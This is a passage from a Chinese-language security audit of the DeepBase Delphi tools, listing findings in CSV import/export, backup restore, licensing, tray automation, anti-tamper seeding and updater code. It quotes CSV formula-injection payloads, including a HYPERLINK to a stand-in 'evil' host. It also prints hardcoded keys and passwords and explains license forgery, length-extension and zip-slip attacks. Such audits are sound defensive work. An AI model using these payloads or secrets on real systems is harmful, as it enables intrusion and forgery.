  if FChkTruncateBeforeImport.Checked then
  begin
    LSQL := Format('DELETE FROM [%s]', [ATableName]);   // :870  自动提交
    ...
  end;
  FConnection.StartTransaction;                          // :877  事务在删除之后才开
```
**说明**：`DELETE` 在事务外执行并立即提交；随后任何一行 `INSERT` 失败（列名不符、约束冲突、R01 的注入串、磁盘满、用户取消进度）都会 `Rollback` 一个**不包含 DELETE** 的空事务 → 表已被清空而未导入任何数据。这是"导入失败反而清空生产表"的数据损坏路径。
**触发条件**：勾选 "Truncate before import" 且导入过程中任一行报错/中止。
**建议修复**：`StartTransaction` 提到 DELETE 之前，让清空与写入同属一个事务；导入整体成功后再 `Commit`；失败时 `Rollback` 并断言行数复原。

#### T-STU-R03 🔴 CSV 解析非引号感知 + 空串与 NULL 混同 → 静默写错数据
**文件**：`Tools\Studio\Frames\Studio.ImportExportFrame.pas:863`、`:884`、`:893-902`
```pascal
  LFields := Line.Split([',']);                          // :863 / :884 未按 RFC4180 处理引号内逗号
  ...
  FieldValue := VarToStr(LFields[J]);
  FieldValue := FieldValue.DeQuotedString('"');         // :900 先去引号再判空，顺序错误
  if FieldValue = '' then SQL := SQL + 'NULL'           // :901-902 空字符串被写成 NULL
```
**说明**：① 字段值含逗号（`"New York, NY"`）时 `Split([','])` 会把它拆成两列，后续整行列错位、`DeQuotedString` 无法修复；② `:901` 把 `""`（CSV 中合法的空字符串）与真正的空单元格都映射成 `SQL NULL` → 不可逆的语义损失，配合 R02 的 truncate 等于静默改数据；③ 无列数与表头一致性校验，多余列被丢弃、缺少列时以"少写几列"形式静默出错。
**触发条件**：导入任何含带引号逗号/显式空串的 CSV（Excel 导出常见）。
**建议修复**：实现状态机式 RFC4180 解析器（或复用成熟单元）；区分 "missing" 与 "empty string"（三态）；表头列数与目标表列数不匹配时中止并报错。

#### T-STU-R04 🔴 CSV 导出未做公式注入防护（CWE-1236）
**文件**：`Tools\Studio\Frames\Studio.ImportExportFrame.pas:633-688`（关键 `:676-677`）
```pascal
  for I := 0 to LFields.Count - 1 do
    LResult := LResult + '"' + LFields[I].Replace('"', '""') + '"';   // 仅转义双引号
```
**说明**：导出只处理引号，未对以 `=`、`+`、`-`、`@`、`\t`、`\r` 开头的单元格加前置防护。DB 中若存在恶意值（如某表 `name` = `=cmd|'/c calc'!A0` 或 `=HYPERLINK("http://evil","x")`），管理员用 Studio 导出 CSV 再在 Excel 中打开即执行。
**触发条件**：导出数据里含以公式引导字符开头的文本 → 下游电子表格软件打开。
**建议修复**：`NeedsFormulaGuard()` 判定后加 `'`（或对危险值统一输出 `="..."` 形式）；导出选项提供 "CSV-injection 防护" 开关，默认开启。

#### T-STU-R05 🔴 备份恢复：zip 条目不校验 + `Files[0]` 盲取 + 覆盖当前库 + 空结果仍报成功
**文件**：`d:\_Progs\02Business\DeepBase\Tools\Studio\Frames\Studio.BackupFrame.pas:442`、`:449-455`、`:419-422`、`:378-381`、`:407`、`:473`、`:482-483`、`:294`、`:350`
```pascal
  ZipFile.ExtractAll(TempFolder);                                    // :442 无条目名校验
  Files := TDirectory.GetFiles(TempFolder);                           // :449
  ExtractedFile := Files[0];                                          // :450-451 盲取第一个
  TFile.Copy(ExtractedFile, FCurrentDBPath, True);                    // :454 直接覆盖当前 DB
```
**说明**：五个缺陷叠加成一条高危链：
① **zip-slip**：`ExtractAll` 前不校验条目名是否含 `..`/绝对路径/盘符 → 恶意备份包可向 TempFolder 之外写文件；
② **无身份校验**：恢复不比对备份元数据中记录的原始文件名（导出时 `:350` 明明用了 `ExtractFileName(FCurrentDBPath)` 作条目名），而用 `Files[0]`——TempFolder 中的**任意第一个文件**（残留、`Thumbs.db`、`desktop.ini`、恶意包里的 `a.txt`）都会被当作数据库覆盖 `FCurrentDBPath`；目录为空时 `Files[0]` 直接**越界访问异常**；
③ **fail-open 假成功**：无 `if Length(Files) = 0` 分支，控制流走到 `:473` 弹 `'Restore completed successfully'`；
④ **前置备份失败不中止**：`:419-422` 调 `DoBackup`，`:378-381` 失败仅 `SetStatus('Backup failed')` 并返回布尔，调用方不检查 → 用户在"已有备份保护"的错觉下用新数据覆盖旧数据，两条路径都失败时数据彻底丢失；
⑤ `:482-483` `except // Ignore`（清理 TempFolder 时吞掉一切异常，含权限/占用）；`:407` 提示文案与实际行为矛盾；`:294` `Item.Data := Pointer(I)` 用列表索引当对象指针传递，排序/删除行后索引即失效（与 `LicenseForm` 的 `:527-528` 同型）。
**触发条件**：恢复任意备份（正常路径可触发 ②③；恶意/损坏备份包触发 ①）。
**建议修复**：`ExtractAll` 前逐条校验 `FileName`（禁 `..`、绝对路径、`:`），解压到 `TPath.NewGuid` 独立目录；按备份元数据里的**确切条目名**取文件，取不到即失败；`TFile.Copy` 前先校验目标头 16 字节为 `SQLite format 3`；`DoBackup` 返回 False 立即中止；清理异常记日志而非吞掉；`Item.Data` 改存 record id 字符串。

#### T-STU-R06 🔴 License 签发密钥硬编码 + 已发密钥明文台账 + 索引耦合撤销
**文件**：`d:\_Progs\02Business\DeepBase\Tools\Studio\Studio.LicenseForm.pas:232`、`:379`、`:442`、`:596`、`:620-622`、`:632`、`:640`、`:506-507`、`:527-528`、`:552-557`
```pascal
  FEdtSecretKey.Text := 'DeepBase2024SecretKey';       // :232 签发密钥写死在产品源码
  ...
  LPath := TPath.Combine(TPath.GetHomePath, '.DeepBase_studio_keys.json');   // :596 / :632
  LJSON.AddPair('key', FIssuedKeys[I]);                                        // :640 明文
```
**说明**：① `:232` 把 HMAC 签发密钥作为默认值编译进可分发的 EXE，任何人从二进制提取即可自签任意"已授权"license；`:379`/`:442` 直接把它用于签名/验证，无覆盖提示、无外部密钥来源；② 已发出的密钥清单以**明文 JSON** 落在用户目录（文件名以点开头只是隐藏约定、不是保护），泄漏即等于签发能力泄漏；③ `:527-528` `FIssuedKeys.Delete(FLvKeys.Selected.Index)` 用 View 行索引直删数据列表，一旦列头排序或选中的是分组行即撤销错误密钥（静默错撤 = 授权治理失效）；④ `:506-507` `ExpiresAt := 0` 表示"永久"（哨兵 0 第四次出现）；⑤ `:552-557` CSV 导出只加引号不双写内部引号，导出的密钥清单再导入会串行；⑥ `:620-622` `except // Ignore load errors` → 台账读失败时静默以空列表继续，随后 `:596` 的保存会**覆盖丢失全部历史签发记录**。
**触发条件**：任何人拿到 Studio.exe 即可伪造 license；或台账文件损坏/被锁 → 签发历史被清空。
**建议修复**：密钥不落产品（DPAPI 保护的外部配置 / 非对称签名，私钥仅存签发方离线环境）；台账中只存密钥哈希+元数据，明文密钥只在生成瞬间显示一次；撤销按 key 唯一 id 定位；`:620` 区分"文件不存在"与"解析失败"，解析失败禁止覆盖写；CSV 走 `StringReplace('"','""')`。

#### T-STU-Y07 🟡 事务内进行 UI 消息泵（`Application.ProcessMessages`）
**文件**：`Studio.ImportExportFrame.pas:913-914`、`:617-618`、`:1023-1024`；`Studio.BackupFrame.pas:332`、`:415`
**说明**：长循环里泵消息但未确认界面已锁定（是否禁用见 §5-Q8），用户可点击"取消"、重复点击"导入"、切换连接、甚至关闭 Frame → 事务上下文被重入/对象被释放。与 R02 组合可产生"半导入 + 事务句柄已被别的操作使用"。
**建议**：进度更新用 `TThread.Queue` + 后台线程，或显式 `LockUI/UnlockUI`，并保证取消走 `Rollback` 路径。

#### T-STU-Y08 🟡 XML 导出未做实体转义
**文件**：`Studio.ImportExportFrame.pas:745-792`（`:760`）
```pascal
  Output.Add('  <data table="' + ATableName + '">');    // :760 属性值未转义
```
**说明**：表名/字段值含 `<`、`&`、`"` 时产出的 XML 非法或被注入额外节点/属性。属"导出物不可再用 + 下游 XML 解析器被注入结构"的功能缺陷（不升 🔴 因 Studio 不消费自身 XML 导出——`:1042-1046` 的 XML 导入未实现）。
**建议**：统一 `EscapeXMLText/EscapeXMLAttr`。

#### T-STU-Y09 🟡 已声明未实现的半成品入口
**文件**：`Studio.ImportExportFrame.pas:1042-1046`（`raise EOperationException.Create('XML import not yet implemented')`）、`:284`、`:551`；`Studio.SQLFrame.pas:850`；`Studio.PromptDebugForm.pas:1231`
**说明**：UI 上可见、点击后抛 "not yet implemented" 的功能。用户视角 = 菜单项存在但永远失败，属半成品；同时该 `raise` 不落证据/审计。
**建议**：`Visible := False` 或灰化，并在 About 中列明不支持项。

#### T-STU-Y10 🟡 LLM API Key 明文落盘（`PasswordChar` 只是视觉遮挡）
**文件**：`Studio.LLMFrame.pas:259-265`、`:524`、`:553`、`:559`；`Studio.LLMConfigForm.pas:66-67`
```pascal
  Config.ApiKey := edtApiKey.Text;      // :553
  FLLM.SaveConfig;                      // :559 → 明文写入配置文件
```
**说明**：`edtApiKey.PasswordChar := '*'`（`:259-265`）与 `FChkShowKey`（`LLMConfigForm.pas:66-67`）都是"眼睛开关"级别的防护，密钥以明文持久化，可被任何读配置文件的进程获取，也会被 R05 的备份包一并带走。属凭据明文类。
**建议**：DPAPI/`TEncryption` 封装后存储；导出/备份路径显式排除凭据文件或提示"含密钥"。

#### T-STU-Y11 🟡 计数异常吞成 `-1` 后继续流程 + N+1 计数查询
**文件**：`Studio.ImportExportFrame.pas:248-257`；`Studio.ProfileFrame.pas:361-366`
**说明**：`COUNT(*)` 失败（表被锁/恶意表名导致语法错，见 R01）被吞成 `-1`，调用方分支只做 `> 0` 判断 → 对"未知是否为空"的表执行 truncate/导入；而 `:235-257` 的逐表 `COUNT(*)` 是 N+1 模式。
**建议**：异常向上抛并中止本次操作；表统计改为单条 UNION 或批量 PRAGMA。

#### T-STU-B12/B13/B14 🔵 性能与原子性
- `Studio.BackupFrame.pas:261-265`、`Studio.ProfileFrame.pas:412-414`：`TComparer<TX>.Construct(...)` 交给 `TArray.Sort<TX>` 后未 `Free` → 每次排序泄漏一个 comparer（与 `CLI.Pipeline`、`LogAnalyzer.Stats` 同型，属全库模式）。建议改匿名函数重载或 `try/finally LComparer.Free`。
- `Studio.BackupFrame.pas:347-357`：备份用 `TFile.Copy(FCurrentDBPath, ...)` 直接复制正在使用的 SQLite 文件，未用 backup API / `VACUUM INTO` / WAL checkpoint → 复制中发生写盘即得到**撕裂不一致的备份**（与 R05"恢复不校验"互锁）。建议 `sqlite3_backup` 或先 `PRAGMA wal_checkpoint(TRUNCATE)`。
- `Studio.BackupFrame.pas:235`、`:253`：备份元数据 sidecar 与 zip 本体分两处保存，而恢复路径（`:449-455`）**根本不读元数据** → 元数据为死信息。建议合并为 zip 内 manifest 条目并在恢复时强制比对。

**未发现问题维度（Studio）**：③ 线程安全——各 Frame 全部在 VCL 主线程内操作，未发现手工创建线程（Y07 的重入风险已单列）；② 内存与生命周期——除 `Item.Data := Pointer(...)` 索引耦合外，Frame 所有权均遵循 `Parent := Self` + Owner 释放，destructor 先解绑事件（`Studio.LLMFrame.pas:171-179` 写法**正确**），未发现泄漏或 double-free。

---

### 3.4 `Tools\Tray\`（系统托盘工具，8 项：🔴2 🟡5 🔵1）

#### T-TRY-R01 🔴 架构：`TKeyboardMouseActions` 约 340 行完整副本内嵌于 Automation，`Tray.KeyboardMouse.pas` 成孤儿死单元
**文件**：`d:\_Progs\02Business\DeepBase\Tools\Tray\Automation\Tray.Automation.pas:550-890`（`SendKeyDown:550`、`SendKeyUp:559`、`SendKeyPress:573`、`SendChar:580`、`SendString:601`、`ParseKeyString:612`、`ExecutePaste:788`、`ExecuteMouseClick:842`、`ExecuteWaitWindow:880`）
对照 `d:\_Progs\02Business\DeepBase\Tools\Tray\Automation\Tray.KeyboardMouse.pas:57`、`:66`、`:80`、`:87`、`:105`、`:108`、`:295`、`:349`、`:389`
```pascal
// Tray.Automation.pas:26-31 uses 子句 —— 不含 Tray.KeyboardMouse
```
**说明**：同名同逻辑的键鼠注入实现存在两份。全仓检索 `Tray.KeyboardMouse` 仅命中该单元自身的 `unit` 声明与 `Tray.Types.pas:6-7` 一句"为打破循环依赖"的注释 → **`Tray.KeyboardMouse.pas` 无任何引用者**（死单元）。这是"能力逻辑第二真源"的具体实例：修 SendInput 扫描码/`KEYEVENTF_UNICODE` 缺陷时必须改两处，而 `Automation.pas` 内的副本不会被任何针对 `KeyboardMouse` 的测试覆盖。
**触发条件**：任何一次键鼠注入相关的缺陷修复都会漏改一份。
**建议修复**：删副本，`Automation` 通过接口复用；若确为破循环依赖，正确做法是抽 `IKeyboardMouseActions` 接口 + 工厂并下沉到无依赖单元，而非复制实现。
**附带**：`Automation.pas:883` 同一函数内 `hwnd`/`hWnd` 混用（易误改）；`:394` `GetTickCount - StartTime > Cardinal(Timeout)` 在 49.7 天回绕点会误判超时（应使用 `TStopwatch`）。

#### T-TRY-R02 🔴 `wait` 参数两分支同码（伪实现）+ 命令直送 `cmd.exe`、无确认无审计、不接治理
**文件**：`Tools\Tray\Automation\Tray.Automation.pas:442-454`；`Tools\Tray\Tray.Launcher.pas:142-144`
```pascal
  if WaitForExit then
    Result := LaunchProgram(LExe, LParams, LCmd, Timeout)     // :446
  else
    Result := LaunchProgram(LExe, LParams, LCmd, Timeout);    // :450-451 两分支逐字符相同
  // TODO(OPS-P2-001)                                          // :448
```
**说明**：① 布尔参数完全无效（要求"同步等待退出并拿退出码"时行为不变），调用方拿到的 `Result` 语义与声明不符 = 静默功能失效；② `LaunchProgram` 把命令行交给 `cmd.exe`（`Tray.Launcher.pas:142-144` 用 `GetEnvironmentVariable('COMSPEC')` 拼 `/c`），JSON 自动化脚本中的命令串未做元字符过滤 → `&`、`|`、`>`、`^` 可拼接任意命令；脚本还允许 `admin` 参数请求提权启动。综合为"以脚本驱动的任意代码执行面"，且该路径**没有确认对话框、不写治理证据、不经过 `IGovernanceService`**（对照 §2 G-R14：治理层本就未接入执行路径）。按用户口径（门禁可绕过/任意执行）定 🔴。
**触发条件**：加载外部/下载的 `.json` 自动化脚本并执行其中 `launch` 动作。
**建议修复**：实现真实 `WaitForExit`（`WaitForSingleObject` + `GetExitCodeProcess`）或删除该参数；`CreateProcess` 直接传程序路径 + 参数（不经 `cmd /c`）；命令白名单；执行前 UI 确认 + 落审计证据，并把该动作纳入治理 `AvailableActions` 判定。

#### T-TRY-Y03 🟡 系统监控三项指标恒为 0（占位实现 + 死变量）
**文件**：`d:\_Progs\02Business\DeepBase\Tools\Tray\Tray.SysMonitor.pas:201-211`
```pascal
  ProcessIds: array[0..1023] of DWORD;   // :201 声明后从未使用
  BytesReturned: DWORD;                   // :202 从未使用
  // For now, just set a placeholder      // :207
  FStats.FProcessCount := 0;              // :208-210 进程/线程/句柄数写死 0
```
**说明**：栈上 4KB 数组占位但不用（未启用 `psapi` 枚举），UI 上"进程数/线程数/句柄数"永远显示 0。属"看起来在工作、实际为常量"的监控失真——监控失真比无监控更危险。
**建议**：`EnumProcesses`/`CreateToolhelp32Snapshot` 实装，或明确标注"未采集"并从 UI 移除该列（不要显示 0）。

#### T-TRY-Y04 🟡 监控线程停止不可中断 + 无锁读结构体
**文件**：`Tools\Tray\Tray.SysMonitor.pas:100-113`、`:236-245`、`:254-256`、`:262-265`
```pascal
    Sleep(FInterval);      // :103 最长可睡 10s，Terminate 无法打断
  FRunning: Boolean;       // :238 普通 Boolean，无原子保证
  Terminate; WaitFor;      // :254-255 析构同步等待 = 关闭卡顿
  Result := FStats;        // :262-265 主线程读 / 监控线程写，无锁
```
**说明**：① `Sleep(FInterval)` 应换成 `FEvent.WaitFor(FInterval)`，否则关闭托盘时最长卡 10 秒；② `FRunning` 跨线程读写无原子性；③ `TSystemStats` 含多个 `Int64`，拷贝非原子 → 主线程可读到半更新组合（UI 数字自相矛盾）。
**建议**：`TEvent` 唤醒式等待；`FRunning` 用 `TInterlocked.Exchange`；快照读取置于 `FLock` 内。

#### T-TRY-Y05 🟡 磁盘容量口径混用 + API 返回值未检查
**文件**：`Tools\Tray\Tray.SysMonitor.pas:179-199`
**说明**：`GetDiskFreeSpaceEx` 返回值与 `TotalFree`/`Total` 未检查，失败时保持零值/陈旧值 → UI 显示 0；且 `UsedPercent` 用 `TotalBytes - TotalFreeBytes`，而 `FreeBytes`（受配额影响的可用字节）另作他用，两口径混用可算出 >100% 或负值。
**建议**：检查返回值、失败置"未知"；统一口径并对百分比 `EnsureRange(0,100)`。

#### T-TRY-Y06/Y07 🟡 未实现动作 / 其余 Frame 抽样结论
- `Tools\Tray\Automation\Tray.Automation.pas:408-410`：`TActionResult.Fail('Action not implemented: ' + ActionType)` —— 与 T-STU-Y09 不同，这里**返回明确失败对象**（不抛、不假成功），故定 🟡。建议同时在脚本校验阶段（`Tray.ScriptModel`）就拒绝未支持动作。
- `Tray.NotesFrame.pas`、`Tray.ProjectsFrame.pas`、`Tray.SchedulerFrame.pas`、`Tray.MonitorFrame.pas`、`Tray.CommandFrame.pas`、`Tray.DevLogFrame.pas` 通读公共 API：均遵循 `Parent := Self` + destructor 先解绑事件/Timer，`TFDQuery` 均 try/finally 配对，SQL 均 `ParamByName`。**② 内存与生命周期、③ 线程安全 未发现问题**。

#### T-TRY-B08 🔵 数据目录推导三处重复且未判空
**文件**：`Tools\Tray\Tray.Launcher.pas:56-64`、`Tools\Tray\Tray.MainForm.pas:463-471`、`Tools\Tray\Tray.Database.pas:159-167`
**说明**：同一段 `GetEnvironmentVariable('APPDATA') + '\...'` 复制三处（第三处为真源），`APPDATA` 为空（服务/登录脚本场景）时拼出相对路径，文件落到 EXE 目录。
**建议**：抽 `TDeepBasePaths.DataDir` 单一函数，内置 `GetHomePath` 回退。

---

### 3.5 `Tools\SeedTool\`（播种/防篡改工具，11 项：🔴5 🟡3 🔵3）

#### T-SEE-R01 🔴 硬编码种子口令作为公共 API 默认参数，并以文档形式制度化共享密钥
**文件**：`d:\_Progs\02Business\DeepBase\Tools\SeedTool\uBasicProtection.pas:10-12`、`:79-85`；`d:\_Progs\02Business\DeepBase\Tools\SeedTool\共享密钥配置.md:10-11`、`:61-62`、`:78-79`、`:82-83`
```pascal
// uBasicProtection.pas:10-12
{ TODO -oDev -cSecurity: Change DEFAULT_SEED_PASSWORD before shipping! }
const
  DEFAULT_SEED_PASSWORD = '@2241114';
// :79-85
function ProtectData(const AData: string; const APassword: string = DEFAULT_SEED_PASSWORD): string;
// 共享密钥配置.md:10-11
Config.EncryptionKey := 'DeepBase_Shared_Key_2025';
Config.Salt := 'DeepBase_Shared_Salt_v1';
```
**说明**：① TODO 未执行即出厂，且该常量是**公共 API 的默认参数值** → 任何忘记传密码的调用方自动使用仓库里公开的口令，加密形同明文（弱口令 + 源码可查 = 凭据明文类）；② `共享密钥配置.md` 把统一密钥/盐写进文档并随 `batch_seed.bat` 复制到 9 个下游项目（文档 `:38-46`），`:78-79` 自陈"所有程序共用密钥，一个被破解可能影响其他…风险可接受"，`:82-83` 建议敏感信息用独立密钥但**代码未提供区分能力**（`GetDefaultConfig` 只有一份常量）。密钥随源码/文档分发即等于无密钥。
**触发条件**：任何使用默认参数的调用；或用文档中的值解密任一项目数据库。
**建议修复**：去掉默认参数（强制显式传入）或默认抛异常；口令/密钥从环境变量/DPAPI 派生，一次性使用后从源码删除常量；文档真实密钥值替换为占位符；`batch_seed.bat` 增加"各项目名称必须互异"的校验。

#### T-SEE-R02 🔴 自称 HMAC 实为 `SHA256(key‖data)` → 长度扩展伪造；比较非常量时间
**文件**：`Tools\SeedTool\uBasicProtection.pas:444-468`、`:471-474`；`Tools\SeedTool\uAntiTamperPackage.pas:243-244`
```pascal
  CryptCreateHash(hProv, CALG_SHA_256, ...);
  CryptHashData(hHash, PByte(AKey),  Length(AKey),  0);   // :449  先 key
  CryptHashData(hHash, PByte(AData), Length(AData), 0);   // :458  后 data
```
**说明**：这是 `H(key || message)`，不是 HMAC（缺 `ipad/opad` 块填充与两次哈希）。Merkle–Damgård 结构下，攻击者已知 `H(k‖m)` 与 `len(k)`（密钥为固定常量字符串，长度可枚举）即可**在不认识密钥的情况下**算出 `H(k‖m‖padding‖m')` 的合法摘要 → 对已签名的播种数据追加 `m'` 伪造"合法"记录；密钥长度未知时可暴力枚举短密钥（`DEFAULT_SEED_PASSWORD` 仅 9 字符）。`:471-474` 用 `SameText` 比较摘要（短路逐字节 + 大小写不敏感额外放宽）→ 时序侧信道。`uAntiTamperPackage.pas:243-244` 注释自陈"实际项目应使用标准 HMAC"，即已知缺陷未修。
**触发条件**：攻击者可提交"合法摘要 + 追加字节"的数据包。
**建议修复**：改用 RTL `THashSHA2.GetHMAC`；比较用恒定时间（可参考 `WebService.Auth.pas:759-786` 的正确写法）；密钥经 KDF 而非直接拼接。

#### T-SEE-R03 🔴 分组填充剥离未校验 → 负索引越界读；短输入静默返回空（fail-open）
**文件**：`Tools\SeedTool\uBasicProtection.pas:134-157`、`:397`、`:402-403`
```pascal
  PadLength := AData[High(AData)];              // :135 未校验 1..BlockSize
  SetLength(LResult, Length(AData) - PadLength); // :137 可为负
  for I := 0 to Length(AData) - PadLength - 1 do  // :140-145
  ...
  if Length(AEncryptedData) < 16 then Exit;      // :397 静默返回空串
```
**说明**：① 末字节取自**攻击者可控数据**：为 `0` 则不剥离填充（明文尾部多 16 字节垃圾）；大于长度则 `Length-PadLength` 为负 → `SetLength` 抛异常，而循环边界 `-1` 组合在其他分支下可造成越界读；② `:397` 对短输入直接 `Exit` 且 `Result` 保持默认空串，调用方无法区分"解密出空内容"与"数据被截断/伪造" —— 解密路径的 fail-open；③ `:402-403` 访问 `EncryptedBytes[0]` 仅由 `:397` 的硬编码 16 保证，两处阈值不联动（换块长即静默错）。
**触发条件**：解密任意被截断/人为构造的密文。
**建议修复**：严格 PKCS#7 校验（`1 <= PadLength <= BlockSize` 且尾部每字节相等），不合规抛显式异常；解密失败统一抛错，禁止返回空串。

#### T-SEE-R04 🔴 完整性哈希走 UTF-8 有损解码 → 二进制篡改不可检测
**文件**：`Tools\SeedTool\uBasicProtection.pas:493-499`；配合 `:484`
```pascal
  LText := TEncoding.UTF8.GetString(AData);   // :494 非法字节 → U+FFFD
  LHash := ComputeSHA256(LText);              // :496 对替换后文本求摘要
```
**说明**：`TEncoding.UTF8.GetString` 把非法 UTF-8 序列统一替换为 `U+FFFD`，多个不同二进制内容会映射到同一字符串 → 摘要冲突。**被保护的文件（收款码图片/二进制 blob）在字节层被替换后哈希可能不变，防篡改检测失效**。`:484` 的 `fmOpenRead or fmShareDenyWrite` 在对"正在被写入的文件"计算哈希时必然抛异常（配合上层吞异常 = 校验被跳过）。
**触发条件**：篡改受保护二进制资产中位于非法 UTF-8 区域的字节。
**建议修复**：哈希直接对字节流计算，禁止经 string 往返；共享模式改 `fmShareDenyNone` 并把大小/mtime 一并纳入签名上下文。

#### T-SEE-R05 🔴 防篡改包：默认硬编码密钥、单开关整体关闭校验、哈希与数据同表可一并伪造、多处 fail-open
**文件**：`d:\_Progs\02Business\DeepBase\Tools\SeedTool\uAntiTamperPackage.pas:111`、`:118`、`:581`、`:297-307`、`:562-591`、`:163-167`、`:321`、`:383`、`:391`、`:399`、`:407`、`:456`、`:668`、`:691`、`:382-414`、`:554`、`:597`、`:130-151`、`:195-218`、`:221-240`、`:646-656`
```pascal
  EncryptionKey := 'Default_AntiTamper_Key_2025';   // :111  GetDefaultConfig 返回值
  Salt := 'DeepMoveC_Default_Salt_2025';            // :118
  if FConfig.EnableHMAC then ...                     // :581  唯一开关，False 即整体跳过校验
  KeyBytes[I] := Byte(FConfig.EncryptionKey[I mod Length(FConfig.EncryptionKey)]);  // :163-167 空密钥 → 除零
```
说明（分组列举）：
- **凭据**：`:111`/`:118` 默认密钥/盐硬编码在单元内，与 R01 的文档共享密钥共同构成"公开密钥体系"。
- **门禁可绕过**：`:581` 单个 `EnableHMAC` 布尔即可整体关闭完整性校验；`:297-307`、`:562-591` 摘要列与数据列存在**同一 SQLite 同一行**，能写 DB 即能同步改摘要（无外部锚点：无签名、无独立哈希链、不接 Governance 证据存储）→ 防篡改属性不成立。
- **崩溃**：`:163-167`（及 `:221` 附近同型派生）当 `EncryptionKey=''` 时 `I mod Length(...)` → 整数除零；`:554`、`:597` 在 `Length(...)=0` 时访问 `[0]` 越界。
- **表名拼接**：`:321`、`:383`、`:391`、`:399`、`:407`、`:456`、`:668`、`:691` 用 `Format` 把表名/列名拼进 DDL/DML（同 T-STU-R01 模式）。
- **异常路径 fail-open**：`:382-412` 四条 `ALTER TABLE` 各自 `try ... except end`，`:414` 无条件 `Result := True` → 迁移失败也报"初始化成功"，后续按旧表结构写数据。
- **资源泄漏**：`WriteLog`（`:130-151`）把 `CloseFile` 放在 `try` 内且 `except` 吞掉，写异常时文件句柄不释放且日志静默丢失。
- **性能**：`:195-218`、`:221-240` 每次加/解密都从头跑 `KdfIterations`（默认 10000）轮派生，无按 (key,salt) 缓存 → 逐行播种时 KDF 成本 ×行数。
- **退出路径**：`:646-656` 检测到篡改后 `MessageBox` + `ShellExecute` 上报 + `ExitProcess(1)` —— `ExitProcess` 不运行单元 finalization、不关闭 FireDAC 连接、不释放 crypto provider 句柄；`ShellExecute` 的目标来自配置（可被 DB 内容影响 → 二次注入面）。
**触发条件**：篡改被播种的 DB 行 + 摘要列即可通过校验；或设 `EnableHMAC=False`；或传空密钥 → 崩溃。
**建议修复**：密钥强制外部注入（无默认值）；摘要锚点外置（HMAC 密钥存 DPAPI/机器绑定，或接入 `Governance` 的哈希链证据存储并由 `Seal` 定期固化 Merkle 根）；`EnableHMAC` 拆为 off/observe/enforce 且 off 需显式登记；空密钥/空盐在 `Initialize` 抛异常；`Result := True` 仅在全部迁移成功后返回；`WriteLog` 用 try/finally `CloseFile`；缓存派生密钥；篡改响应改为"标记 + 交上层决定退出"，退出前走正常清理。

#### T-SEE-Y06/Y07/Y08 🟡 派生不一致 / 十六进制转换缺陷 / 手工 API 声明
- **Y06** `uAntiTamperPackage.pas:176` vs `:261` vs `:331` vs `:406` 四处使用四种不同密钥派生方式（取模展开 / 盐拼接 / KDF 循环 / 直接截断），`GetDynamicKey` 恒返回 `''`，而 `:405` 注释宣称"使用 PBKDF2" —— 注释与实现构成第二真源；同一份数据在不同入口下可能被不同密钥加解密，表现为"偶发解密失败"。
- **Y07** `uBasicProtection.pas:512-519` `HexToBytes` 用 `StrToInt('$' + Copy(...))`，遇非 hex 字符抛 `EConvertError`（上层吞异常后表现为"校验失败"而非"数据损坏"），奇数长度静默丢尾字节；`:502-509` `BytesToHex` 用 `Result := Result + ...` → O(n²)（大 blob 播种时明显）。建议 `SysUtils.HexToBinaryBin`，并先校验长度奇偶与字符集。
- **Y08** `uBasicProtection.pas:33-60` 手工重复声明 `advapi32` CryptoAPI 原型（与 `Winapi.CryptTbl` 官方声明双真源）—— 签名/调用约定有出入即为难以定位的内存破坏。建议改用 RTL external 声明或 `THashSHA2` 高层 API。

#### T-SEE-B09/B10/B11 🔵
- `uSeedMain.pas`、`SeedTool.dpr` 通读：`TFDQuery`/`TFDConnection` 均 try/finally 配对释放，未自建线程，写入使用参数化 SQL。**② 内存与生命周期、③ 线程安全、⑥ 性能 未发现问题**（唯一可提：逐行 INSERT 未包事务，批量播种时每行一次自动提交，建议外层 `StartTransaction/Commit`）。
- 建议把 `SeedTool` 移出 `Tools\` 产品目录（一次性内部工具，其"防篡改"语义与 DeepBase 主库无关，混在库内易被误当可信组件复用）。
- `batch_seed.bat` 把同一份 `template.db` 复制到 9 个外部项目目录，属跨仓库分发密钥材料的行为，建议纳入发布流程审计。

**未发现问题维度（Tray/Studio/SeedTool 汇总）**：④ 异常处理之"异常路径资源泄漏"仅 `uAntiTamperPackage.WriteLog`（T-SEE-R05）与 `BackupFrame` 清理（T-STU-R05⑤）两处命中，其余未发现句柄/对象在异常路径泄漏；⑥ 性能除 T-SEE-Y07、T-STU-B12/Y11、T-TRY-R01 附带项外**未发现问题**。

---

### 3.6 `Tools\UpdaterHelper\`（更新执行器，8 项：🔴4 🟡2 🔵2）

#### T-UPD-R01 🔴 不传 `--sha256` 即完全跳过包校验（fail-open）+ 参数可被误吞
**文件**：`d:\_Progs\02Business\DeepBase\Tools\UpdaterHelper\UpdaterHelper.Core.pas:191-192`、`:449-459`、`:401`
```pascal
function VerifyPackageHash(const PackagePath, ExpectedSha256: string; out ErrorMessage: string): Boolean;
begin
  Result := False;
  ErrorMessage := '';
  if Trim(ExpectedSha256) = '' then
    Exit(True);                              // :191-192  无期望值 → 直接判为"校验通过"
```
**说明**：这是更新流程里唯一的包完整性关卡，而它的空值分支返回 **True**。`ParseArgs`（`:449-459`）不要求 `--sha256` 存在也不报错；`:401` 的 `not Args[I+1].StartsWith('--')` 判断使得 `--sha256 --force` 这类误用会把 `--force` 当作哈希、或直接让哈希保持空 → 仍进 `Exit(True)` 分支。调用方（主程序下载后拉起本工具）一旦漏传参数，更新器会**静默安装未校验的包**，与不校验无异。
**触发条件**：主程序调用时忘传/错传 `--sha256`；或中间人替换包且未提供哈希。
**建议修复**：无 `ExpectedSha256` 时 **fail-closed**（报错退出）；`ParseArgs` 将 `--sha256` 列为必填并校验格式（64 位 hex）；拒绝 `--sha256` 后跟另一个开关。

#### T-UPD-R02 🔴 全程无签名仅靠哈希 + zip-slip 防护用错位置 + 校验与解压间 TOCTOU
**文件**：`Tools\UpdaterHelper\UpdaterHelper.Core.pas:289`、`:301`、`:183-213`、`:65-75`
```pascal
  Zip.ExtractAll(ExtractDir);                 // :289 先全量解压
  ...
  if not IsPathUnderRoot(ExtractDir, LSource) // :301 后校验“拷贝目标”在根内
```
